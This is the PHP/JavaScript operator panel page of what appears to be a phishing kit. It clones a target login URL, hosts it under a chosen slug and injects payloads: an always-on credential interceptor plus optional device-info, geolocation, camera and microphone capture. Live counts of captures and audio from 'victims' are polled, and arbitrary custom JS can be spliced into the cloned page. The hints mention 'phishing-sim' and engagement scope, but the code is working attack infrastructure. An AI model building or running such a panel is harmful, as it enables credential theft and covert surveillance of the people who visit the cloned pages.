<?php
/**
 * route-targets.php — UI for the Targets route.
 *
 * Renders:
 *   - a "create target" form (URL, slug, payload checkboxes)
 *   - a live list of cloned targets with rename / delete / open-live actions
 *
 * All data flows through api/targets.php; this file only renders skeleton
 * markup and JS that hits the API.
 *
 * Caller (panel.php) is responsible for auth — this partial assumes the
 * operator is already signed in.
 */
?>
<section class="targets-section">

  <!-- ── CREATE TARGET ──────────────────────────────────── -->
  <div class="form-card">
    <div class="form-card-header">
      <div class="form-card-title">// new target</div>
      <div class="form-card-sub">Clone a URL and host it under a clean slug.</div>
    </div>

    <form id="target-create-form" autocomplete="off" onsubmit="createTarget(event)">

      <div class="form-group">
        <label class="form-label" for="t-url">Source URL</label>
        <input id="t-url" name="url" type="url" class="form-input"
               placeholder="https://example.com/login"
               required>
        <span class="form-hint">// http or https · the page is fetched once, assets inlined locally</span>
      </div>

      <div class="form-group">
        <label class="form-label" for="t-slug">Slug</label>
        <div style="display:flex;gap:var(--space-2);align-items:stretch">
          <input id="t-slug" name="slug" type="text" class="form-input"
                 pattern="[a-z0-9](?:[a-z0-9_-]*[a-z0-9])?"
                 minlength="1" maxlength="32"
                 placeholder="leave blank for auto-generated"
                 style="flex:1;font-family:var(--font-mono)">
          <button type="button" class="btn btn-outline btn-sm"
                  onclick="document.getElementById('t-slug').value=''" title="Clear slug">
            <svg class="icon icon-sm"><use href="#i-x"/></svg>
          </button>
        </div>
        <span class="form-hint">// will be served at <code id="t-slug-preview">/</code> · 1–32 chars · lowercase letters, digits, “-”, “_”</span>
      </div>

      <div class="form-group">
        <label class="form-label">Payloads</label>
        <div class="checkbox-row">
          <label class="checkbox" title="Always on — credential interceptor is the core of any phishing-sim clone">
            <input type="checkbox" checked disabled>
            <span>credentials <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
          </label>
          <label class="checkbox">
            <input type="checkbox" name="payloads[]" value="device-info" checked>
            <span>device-info</span>
          </label>
          <label class="checkbox">
            <input type="checkbox" name="payloads[]" value="geolocation">
            <span>geolocation</span>
          </label>
          <label class="checkbox">
            <input type="checkbox" name="payloads[]" value="camera">
            <span>camera</span>
          </label>
          <label class="checkbox">
            <input type="checkbox" name="payloads[]" value="microphone">
            <span>microphone</span>
          </label>
        </div>
        <span class="form-hint">// credentials always intercepted · enable other modules only within engagement scope</span>
      </div>

      <div id="t-create-error" class="login-error" style="display:none">
        <svg class="icon icon-sm"><use href="#i-alert-octagon"/></svg>
        <span id="t-create-error-msg"></span>
      </div>

      <div id="t-create-progress" class="create-progress" style="display:none">
        <span class="spinner" aria-hidden="true"></span>
        <span class="create-progress-label">Cloning…</span>
        <span class="create-progress-hint">// chrome render can take 5–25s for SPAs</span>
      </div>

      <div style="display:flex;gap:var(--space-2);justify-content:flex-end">
        <button type="reset" class="btn btn-ghost btn-sm" id="t-create-reset">Reset</button>
        <button type="submit" class="btn btn-primary btn-sm" id="t-create-btn">
          <svg class="icon icon-sm" id="t-create-btn-icon"><use href="#i-zap"/></svg>
          <span class="spinner spinner-sm" id="t-create-btn-spinner" style="display:none" aria-hidden="true"></span>
          <span id="t-create-btn-label">Clone &amp; host</span>
        </button>
      </div>
    </form>
  </div>

  <!-- ── TARGET LIST ─────────────────────────────────────── -->
  <div class="targets-list-header">
    <h2 class="section-title">// active targets</h2>
    <button type="button" class="btn btn-outline btn-sm" onclick="loadTargets()">
      <svg class="icon icon-sm"><use href="#i-refresh"/></svg>
      Refresh
    </button>
  </div>

  <div id="targets-list" class="targets-list">
    <div class="alert alert-info" id="targets-loading">
      <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
      <div class="alert-content">
        <div class="alert-title">LOADING</div>
        <div class="alert-body">Fetching targets…</div>
      </div>
    </div>
  </div>

</section>

<!-- Card template used by JS to render each target row. -->
<template id="target-card-tpl">
  <article class="target-card">
    <div class="target-card-head">
      <div class="target-card-slug">
        <span class="t-mono t-slug-text"></span>
        <span class="t-custom-js-badge" title="Has operator-supplied custom JS" style="display:none">
          <svg class="icon icon-xs"><use href="#i-code"/></svg> custom JS
        </span>
      </div>
      <div class="target-card-actions">
        <button type="button" class="btn btn-outline btn-xs t-copy-url">
          <svg class="icon icon-sm"><use href="#i-copy"/></svg>
          Copy URL
        </button>
        <button type="button" class="btn btn-outline btn-xs t-edit">
          <svg class="icon icon-sm"><use href="#i-edit"/></svg>
          Edit
        </button>
        <button type="button" class="btn btn-outline btn-xs danger t-delete">
          <svg class="icon icon-sm"><use href="#i-trash"/></svg>
          Delete
        </button>
      </div>
    </div>

    <div class="target-card-body">
      <div class="target-card-row">
        <span class="target-card-label">Live URL</span>
        <code class="t-live-url"></code>
      </div>
      <div class="target-card-row">
        <span class="target-card-label">Source</span>
        <span class="t-source-url"></span>
      </div>
      <div class="target-card-row">
        <span class="target-card-label">Payloads</span>
        <span class="t-payloads"></span>
      </div>
      <div class="target-card-row target-card-stats">
        <span><strong class="t-events">0</strong> events</span>
        <span><strong class="t-captures">0</strong> captures</span>
        <span><strong class="t-audio">0</strong> audio</span>
        <span class="t-last-event"></span>
        <span class="t-render-mode" title="how the page was cloned"></span>
        <span class="t-created"></span>
      </div>
    </div>
  </article>
</template>

<!-- Edit-target modal — slug rename + custom JS injection. -->
<div class="modal-scrim" id="modal-target-edit" onclick="handleScrimClick(event,'modal-target-edit')">
  <div class="modal modal-lg" onclick="event.stopPropagation()">
    <form id="target-edit-form" onsubmit="submitTargetEdit(event)" autocomplete="off">
      <div class="modal-header">
        <div class="modal-header-left">
          <div class="modal-icon modal-icon-cyan"><svg class="icon icon-md"><use href="#i-edit"/></svg></div>
          <div>
            <div class="modal-title">EDIT TARGET</div>
            <div class="modal-subtitle">// rename slug · inject custom JS</div>
          </div>
        </div>
        <button type="button" class="modal-x" onclick="closeModal('modal-target-edit')"><svg class="icon icon-sm"><use href="#i-x"/></svg></button>
      </div>

      <div class="modal-body">
        <input type="hidden" id="t-edit-original-slug">

        <div class="form-group">
          <label class="form-label" for="t-edit-slug">Slug</label>
          <input id="t-edit-slug" name="new_slug" class="form-input" type="text"
                 pattern="[a-z0-9](?:[a-z0-9_-]*[a-z0-9])?"
                 minlength="1" maxlength="32" required
                 style="font-family:var(--font-mono)">
          <span class="form-hint">// 1–32 chars · lowercase letters, digits, “-”, “_” · directory will be renamed atomically</span>
        </div>

        <!-- Payload toggles. Mirrors the create form so an operator can pivot a
             target's focus (e.g. mic → cam) without having to delete and
             re-clone the URL. credentials.js is always on by design. -->
        <div class="form-group">
          <label class="form-label">Payloads</label>
          <div class="checkbox-row">
            <label class="checkbox" title="Always on — credential interceptor is the core of any phishing-sim clone">
              <input type="checkbox" checked disabled>
              <span>credentials <em style="font-style:normal;color:var(--text-muted)">(always)</em></span>
            </label>
            <label class="checkbox">
              <input type="checkbox" class="t-edit-payload" value="device-info">
              <span>device-info</span>
            </label>
            <label class="checkbox">
              <input type="checkbox" class="t-edit-payload" value="geolocation">
              <span>geolocation</span>
            </label>
            <label class="checkbox">
              <input type="checkbox" class="t-edit-payload" value="camera">
              <span>camera</span>
            </label>
            <label class="checkbox">
              <input type="checkbox" class="t-edit-payload" value="microphone">
              <span>microphone</span>
            </label>
          </div>
          <span class="form-hint">// toggles re-splice the payload block in <code>index.html</code> on save · keep scope inside the engagement</span>
        </div>

        <div class="form-group">
          <label class="form-label" for="t-edit-js">Custom JS</label>
          <textarea id="t-edit-js" name="custom_js" class="form-input form-input-mono"
                    rows="14" placeholder="// runs LAST, after the bootstrap and all built-in payloads.&#10;// Has access to window.__SB_TARGET, window.__SB_API('kind'), etc.&#10;// Example:&#10;//   document.title = 'Loading…';&#10;//   fetch(__SB_API('cred'), {method:'POST', body: JSON.stringify({tag:'visited'})});"
                    spellcheck="false"></textarea>
          <span class="form-hint">// inlined into a &lt;script&gt; right before the page's &lt;/body&gt; · max 256 KiB · saved into <code>meta.json.custom_js</code> and re-spliced into the cloned <code>index.html</code> on save</span>
        </div>

        <div class="login-error" id="t-edit-error" style="display:none">
          <svg class="icon icon-sm"><use href="#i-alert-octagon"/></svg>
          <span id="t-edit-error-msg"></span>
        </div>
      </div>

      <div class="modal-footer">
        <a class="btn btn-ghost btn-sm" id="t-edit-open-live" target="_blank" rel="noopener">
          <svg class="icon icon-sm"><use href="#i-external-link"/></svg>
          Open live
        </a>
        <span style="flex:1"></span>
        <button type="button" class="btn btn-ghost btn-sm" onclick="closeModal('modal-target-edit')">Cancel</button>
        <button type="submit" class="btn btn-primary btn-sm" id="t-edit-save">
          <svg class="icon icon-sm" id="t-edit-save-icon"><use href="#i-save"/></svg>
          <span class="spinner spinner-sm" id="t-edit-save-spinner" style="display:none" aria-hidden="true"></span>
          <span>Save changes</span>
        </button>
      </div>
    </form>
  </div>
</div>

<script>
/* ── Targets module ─────────────────────────────────────────
   Self-contained: hits api/targets.php, renders into #targets-list,
   handles create / edit (slug + custom JS) / delete flows.

   Runs an auto-refresh poll every AUTO_REFRESH_MS so capture counts
   tick up live as victims interact, with the timer pausing while the
   tab is hidden (saves cycles + avoids backing up requests). */
(function () {
  const API = 'api/targets.php';
  const AUTO_REFRESH_MS = 5000;

  const $list   = document.getElementById('targets-list');
  const $tpl    = document.getElementById('target-card-tpl');
  const $form   = document.getElementById('target-create-form');
  const $url    = document.getElementById('t-url');
  const $slug   = document.getElementById('t-slug');
  const $prev   = document.getElementById('t-slug-preview');
  const $err    = document.getElementById('t-create-error');
  const $errMsg = document.getElementById('t-create-error-msg');
  const $btn    = document.getElementById('t-create-btn');
  const $btnIcon    = document.getElementById('t-create-btn-icon');
  const $btnSpinner = document.getElementById('t-create-btn-spinner');
  const $btnLabel   = document.getElementById('t-create-btn-label');
  const $progress   = document.getElementById('t-create-progress');
  const $editForm    = document.getElementById('target-edit-form');
  const $editOrig    = document.getElementById('t-edit-original-slug');
  const $editSlug    = document.getElementById('t-edit-slug');
  const $editJs      = document.getElementById('t-edit-js');
  const $editErr     = document.getElementById('t-edit-error');
  const $editErrMsg  = document.getElementById('t-edit-error-msg');
  const $editSave    = document.getElementById('t-edit-save');
  const $editSaveIcon    = document.getElementById('t-edit-save-icon');
  const $editSaveSpinner = document.getElementById('t-edit-save-spinner');
  const $editOpenLive    = document.getElementById('t-edit-open-live');

  /* Slug preview as the operator types. */
  function updateSlugPreview() {
    const v = $slug.value.trim().toLowerCase();
    $prev.textContent = v === '' ? '/<auto-generated>' : '/' + v;
  }
  $slug.addEventListener('input', updateSlugPreview);
  updateSlugPreview();

  /* Helper: build the full live URL given a slug. */
  function liveUrlFor(slug) {
    return location.origin + '/' + slug;
  }

  /* ── Render ──────────────────────────────────────────── */
  function render(targets) {
    $list.innerHTML = '';

    if (!targets.length) {
      const empty = document.createElement('div');
      empty.className = 'alert alert-info';
      empty.innerHTML = `
        <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
        <div class="alert-content">
          <div class="alert-title">NO TARGETS YET</div>
          <div class="alert-body">Use the form above to clone a URL.</div>
        </div>`;
      $list.appendChild(empty);
      return;
    }

    targets.forEach(t => {
      const node = $tpl.content.firstElementChild.cloneNode(true);
      const liveUrl = liveUrlFor(t.slug);

      node.dataset.slug = t.slug;
      node.querySelector('.t-slug-text').textContent  = t.slug;
      node.querySelector('.t-live-url').textContent   = liveUrl;
      node.querySelector('.t-source-url').textContent = t.url;
      node.querySelector('.t-payloads').textContent   =
        (t.payloads || []).join(', ') || '— none —';
      node.querySelector('.t-events').textContent     = t.events_count   ?? 0;
      node.querySelector('.t-captures').textContent   = t.captures_count ?? 0;
      node.querySelector('.t-audio').textContent      = t.audio_count    ?? 0;
      node.querySelector('.t-last-event').textContent = t.last_event_at
        ? '· last ' + formatRelative(t.last_event_at)
        : '';
      node.querySelector('.t-render-mode').textContent = t.render_mode === 'chrome'
        ? '· chrome render'
        : (t.render_mode === 'http' ? '· http fallback' : '');
      node.querySelector('.t-created').textContent    = '// ' + formatDate(t.created_at);

      // Surface the custom-JS state so an operator can spot a tweaked
      // target without opening the modal.
      const hasJs = (t.custom_js || '').trim().length > 0;
      node.querySelector('.t-custom-js-badge').style.display = hasJs ? '' : 'none';

      node.querySelector('.t-copy-url').addEventListener('click', () => copyToClipboard(liveUrl));
      node.querySelector('.t-edit')    .addEventListener('click', () => openEditModal(t));
      node.querySelector('.t-delete')  .addEventListener('click', () => deleteTarget(t.slug));

      $list.appendChild(node);
    });
  }

  function formatDate(unix) {
    if (!unix) return 'unknown';
    const d = new Date(unix * 1000);
    return d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  }

  function formatRelative(unix) {
    if (!unix) return '';
    const diff = Math.max(0, Math.floor(Date.now() / 1000) - unix);
    if (diff < 60)     return diff + 's ago';
    if (diff < 3600)   return Math.floor(diff / 60) + 'm ago';
    if (diff < 86400)  return Math.floor(diff / 3600) + 'h ago';
    return Math.floor(diff / 86400) + 'd ago';
  }

  /* ── Network ─────────────────────────────────────────── */
  // refreshOnly=true skips the loud error UI (so a failed background
  // poll doesn't wipe the rendered cards mid-session).
  async function loadTargets(refreshOnly) {
    try {
      const res = await fetch(API, { credentials: 'same-origin', cache: 'no-store' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'request failed');
      render(json.targets || []);
    } catch (e) {
      if (refreshOnly) return;
      $list.innerHTML = `
        <div class="alert alert-error">
          <div class="alert-icon"><svg class="icon icon-md"><use href="#i-alert-octagon"/></svg></div>
          <div class="alert-content">
            <div class="alert-title">LOAD FAILED</div>
            <div class="alert-body">${escapeHtml(e.message)}</div>
          </div>
        </div>`;
    }
  }
  window.loadTargets = () => loadTargets(false);     // Refresh button

  async function createTarget(e) {
    e.preventDefault();
    $err.style.display = 'none';
    setCreateBusy(true);

    try {
      const fd = new FormData($form);
      fd.append('action', 'create');
      const res = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'create failed');

      $form.reset();
      updateSlugPreview();
      fireToast('success', 'TARGET CREATED', 'Now hosted at ' + liveUrlFor(json.target.slug));
      await loadTargets(false);
    } catch (e) {
      $errMsg.textContent = e.message;
      $err.style.display = '';
    } finally {
      setCreateBusy(false);
    }
  }
  window.createTarget = createTarget;

  function setCreateBusy(busy) {
    $btn.disabled              = busy;
    $btnIcon.style.display     = busy ? 'none' : '';
    $btnSpinner.style.display  = busy ? '' : 'none';
    $btnLabel.textContent      = busy ? 'Cloning…' : 'Clone & host';
    $progress.style.display    = busy ? '' : 'none';
  }

  async function deleteTarget(slug) {
    if (!confirm('Delete target "' + slug + '" and all its captured data? This cannot be undone.')) return;
    try {
      const fd = new FormData();
      fd.append('action', 'delete');
      fd.append('slug',   slug);
      const res = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'delete failed');
      fireToast('success', 'TARGET DELETED', slug + ' removed.');
      await loadTargets(false);
    } catch (e) {
      fireToast('error', 'DELETE FAILED', e.message);
    }
  }

  /* ── Edit modal ──────────────────────────────────────── */
  function openEditModal(target) {
    $editErr.style.display     = 'none';
    $editOrig.value            = target.slug;
    $editSlug.value            = target.slug;
    $editJs.value              = target.custom_js || '';
    $editOpenLive.href         = liveUrlFor(target.slug);

    // Mirror the target's current payload selection into the checkboxes.
    // The 'credentials' checkbox is intentionally not in this NodeList
    // (it has no class on it) so the always-on rule isn't disturbed.
    const enabled = new Set(target.payloads || []);
    document.querySelectorAll('.t-edit-payload').forEach(cb => {
      cb.checked = enabled.has(cb.value);
    });

    setEditBusy(false);
    openModal('modal-target-edit');
    setTimeout(() => $editJs.focus(), 50);
  }

  function setEditBusy(busy) {
    $editSave.disabled              = busy;
    $editSaveIcon.style.display     = busy ? 'none' : '';
    $editSaveSpinner.style.display  = busy ? '' : 'none';
  }

  async function submitTargetEdit(e) {
    e.preventDefault();
    $editErr.style.display = 'none';
    setEditBusy(true);

    const oldSlug  = $editOrig.value;
    const newSlug  = $editSlug.value.trim().toLowerCase();
    const customJs = $editJs.value;
    const payloads = Array.from(document.querySelectorAll('.t-edit-payload'))
                          .filter(cb => cb.checked)
                          .map(cb => cb.value);

    try {
      const fd = new FormData();
      fd.append('action',    'update');
      fd.append('slug',      oldSlug);
      fd.append('new_slug',  newSlug);
      fd.append('custom_js', customJs);
      // Empty array still needs to round-trip so the backend can tell the
      // difference between "operator unchecked everything" and "operator
      // didn't touch the field at all" — sentinel value handles the empty case.
      if (payloads.length === 0) {
        fd.append('payloads_empty', '1');
      } else {
        payloads.forEach(p => fd.append('payloads[]', p));
      }
      const res  = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'update failed');

      // Verify the JS actually landed in the cloned page, since the user
      // explicitly asked for that. We pull index.html and look for a
      // distinctive substring of the saved JS — long enough to be unique
      // but short enough to survive minor whitespace differences.
      if (customJs.trim() !== '') {
        const probe = customJs.trim().slice(0, 120);
        try {
          const html = await (await fetch('/' + json.slug, {
            credentials: 'omit', cache: 'no-store',
          })).text();
          if (!html.includes(probe)) {
            throw new Error('saved, but injection probe not found in /' + json.slug);
          }
        } catch (probeErr) {
          // A probe failure isn't fatal — the API already returned ok — but
          // surface it so the operator knows something looks off.
          fireToast('error', 'INJECTION PROBE FAILED', probeErr.message);
        }
      }

      closeModal('modal-target-edit');
      const msg = (oldSlug !== newSlug)
        ? oldSlug + ' → ' + newSlug + (customJs ? ' · custom JS updated' : '')
        : (customJs ? 'Custom JS updated' : 'No changes');
      fireToast('success', 'TARGET UPDATED', msg);
      await loadTargets(false);
    } catch (e) {
      $editErrMsg.textContent = e.message;
      $editErr.style.display = '';
    } finally {
      setEditBusy(false);
    }
  }
  window.submitTargetEdit = submitTargetEdit;

  /* ── Misc ────────────────────────────────────────────── */
  // The async Clipboard API only works in secure contexts (HTTPS, or http://
  // on localhost). Operators running the panel over plain HTTP on a LAN
  // address would fall through and see no toast at all — try the modern API
  // first, then fall back to the textarea + execCommand trick.
  async function copyToClipboard(text) {
    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(text);
        fireToast('success', 'COPIED', text);
        return;
      } catch (_) { /* fall through */ }
    }

    const ta = document.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.top = '0';
    ta.style.left = '-9999px';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    let ok = false;
    try { ok = document.execCommand('copy'); } catch (_) {}
    document.body.removeChild(ta);

    if (ok) fireToast('success', 'COPIED', text);
    else    fireToast('error',   'COPY FAILED', 'Clipboard not available — copy the URL manually.');
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    }[c]));
  }
  function escapeAttr(s) { return escapeHtml(s); }

  /* ── Auto-refresh ────────────────────────────────────── */
  // We re-fetch targets every AUTO_REFRESH_MS so capture/event counts
  // update without a manual click. The poll is suspended while the tab
  // is hidden (page visibility API) and resumes immediately on focus —
  // this avoids a thundering herd of stale requests piling up.
  let pollTimer = null;
  function startPoll() {
    stopPoll();
    pollTimer = setInterval(() => loadTargets(true), AUTO_REFRESH_MS);
  }
  function stopPoll() {
    if (pollTimer !== null) { clearInterval(pollTimer); pollTimer = null; }
  }
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) stopPoll();
    else { loadTargets(true); startPoll(); }
  });

  /* Initial load + start the poll. */
  loadTargets(false).then(startPoll);
})();
</script>

<style>
/* Targets-route-specific styles. Reuses tokens from cypher-ui.css —
   matches the rest of the panel's cyan/dark cyber-deck look. */

.targets-section { display: flex; flex-direction: column; gap: var(--space-5); }

.form-card {
  background: var(--bg-surface);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-lg);
  padding: var(--space-5);
}
.form-card-header { margin-bottom: var(--space-4); }
.form-card-title  {
  color: var(--accent-primary);
  font-family: var(--font-mono);
  font-size: var(--text-sm); font-weight: 600;
  letter-spacing: .04em;
}
.form-card-sub    {
  color: var(--text-muted);
  font-size: var(--text-sm); margin-top: var(--space-1);
}

.checkbox-row     { display: flex; flex-wrap: wrap; gap: var(--space-2); }
.checkbox         {
  display: inline-flex; align-items: center; gap: 6px;
  cursor: pointer; user-select: none;
  padding: 6px 10px; border-radius: var(--radius-sm);
  border: 1px solid var(--border-subtle);
  font-family: var(--font-mono); font-size: var(--text-sm);
  color: var(--text-secondary);
  transition: background .15s, border-color .15s, color .15s;
}
.checkbox:hover   { border-color: var(--border-default); color: var(--text-primary); }
.checkbox input   { accent-color: var(--accent-primary); }

.targets-list-header {
  display: flex; justify-content: space-between; align-items: center;
  margin-top: var(--space-2);
}
.section-title    {
  color: var(--text-muted);
  font-family: var(--font-mono);
  font-size: var(--text-sm); font-weight: 500; margin: 0;
  letter-spacing: .04em;
}

.targets-list     { display: flex; flex-direction: column; gap: var(--space-3); }

.target-card      {
  background: var(--bg-surface);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-lg);
  padding: var(--space-4);
  transition: border-color .15s;
}
.target-card:hover { border-color: var(--border-default); }

.target-card-head {
  display: flex; justify-content: space-between; align-items: center;
  gap: var(--space-3); flex-wrap: wrap;
  margin-bottom: var(--space-3);
  padding-bottom: var(--space-3);
  border-bottom: 1px solid var(--border-subtle);
}
.target-card-slug {
  display: inline-flex; align-items: center; gap: 6px;
  font-family: var(--font-mono); font-size: var(--text-base); font-weight: 600;
  color: var(--accent-primary);
}
.target-card-actions { display: flex; gap: 6px; flex-wrap: wrap; }

.target-card-body { display: flex; flex-direction: column; gap: 6px; }
.target-card-row  { display: flex; gap: var(--space-3); align-items: baseline; flex-wrap: wrap; }
.target-card-row code, .target-card-row .t-source-url {
  font-family: var(--font-mono); font-size: var(--text-sm);
  color: var(--text-primary); word-break: break-all;
}
.target-card-row .t-live-url { color: var(--text-code); }
.target-card-label {
  min-width: 80px;
  color: var(--text-muted);
  font-size: var(--text-xs); text-transform: uppercase; letter-spacing: .06em;
}
.target-card-stats {
  margin-top: var(--space-2); padding-top: var(--space-2);
  border-top: 1px dashed var(--border-subtle);
  font-family: var(--font-mono); font-size: var(--text-xs);
  color: var(--text-muted);
  gap: var(--space-4);
}
.target-card-stats strong { color: var(--text-primary); font-weight: 600; }

.icon-btn {
  background: none; border: 1px solid transparent;
  color: var(--text-muted);
  cursor: pointer; padding: 2px 6px; border-radius: var(--radius-sm);
  display: inline-flex; align-items: center; justify-content: center;
  transition: color .15s, border-color .15s, background .15s;
}
.icon-btn:hover {
  color: var(--accent-primary);
  border-color: var(--border-default);
  background: var(--accent-primary-muted);
}

.btn.danger, .btn-outline.danger {
  color: var(--accent-red); border-color: var(--accent-red-glow);
}
.btn.danger:hover, .btn-outline.danger:hover {
  background: rgba(255,45,85,.08);
  box-shadow: var(--glow-red-sm);
}

.form-input-sm  {
  font-size: var(--text-sm); padding: 4px 8px;
  max-width: 240px;
  font-family: var(--font-mono);
}

/* Style for the existing .form-hint used here and in the settings modal. */
.form-hint {
  color: var(--text-muted);
  font-family: var(--font-mono);
  font-size: var(--text-xs);
  line-height: 1.5;
}
.form-hint code {
  background: var(--bg-overlay);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 1px 5px;
  color: var(--text-code);
}

/* In-button spinner used during clone + edit save. Sized to sit where the
   leading icon does so the button width doesn't jump. */
.spinner {
  display: inline-block;
  width: 14px; height: 14px;
  border: 2px solid color-mix(in srgb, var(--accent-primary) 35%, transparent);
  border-top-color: var(--accent-primary);
  border-radius: 50%;
  animation: sb-spin .7s linear infinite;
  vertical-align: -2px;
}
.spinner-sm { width: 12px; height: 12px; border-width: 2px; vertical-align: -1px; }
@keyframes sb-spin { to { transform: rotate(360deg); } }

/* Status row that pops in under the form while a clone is in flight. */
.create-progress {
  display: flex; align-items: center; gap: var(--space-2);
  padding: var(--space-2) var(--space-3);
  margin-top: var(--space-2);
  background: var(--accent-primary-muted, rgba(0, 200, 255, .06));
  border: 1px dashed var(--border-default);
  border-radius: var(--radius-sm);
  color: var(--text-secondary);
  font-family: var(--font-mono); font-size: var(--text-xs);
}
.create-progress-label { color: var(--accent-primary); font-weight: 600; }
.create-progress-hint  { color: var(--text-muted); }

/* Custom-JS badge on a target card — mini pill next to the slug. */
.t-custom-js-badge {
  display: inline-flex; align-items: center; gap: 4px;
  padding: 1px 8px;
  font-family: var(--font-mono); font-size: var(--text-xs); font-weight: 500;
  color: var(--accent-primary);
  background: var(--accent-primary-muted, rgba(0, 200, 255, .08));
  border: 1px solid var(--accent-primary-glow, rgba(0, 200, 255, .25));
  border-radius: 999px;
  letter-spacing: .04em;
}

/* Mono textarea for the JS body inside the edit modal. */
.form-input-mono {
  font-family: var(--font-mono); font-size: var(--text-sm);
  line-height: 1.5;
  resize: vertical;
  min-height: 200px;
  width: 100%;
  white-space: pre;
}
</style>
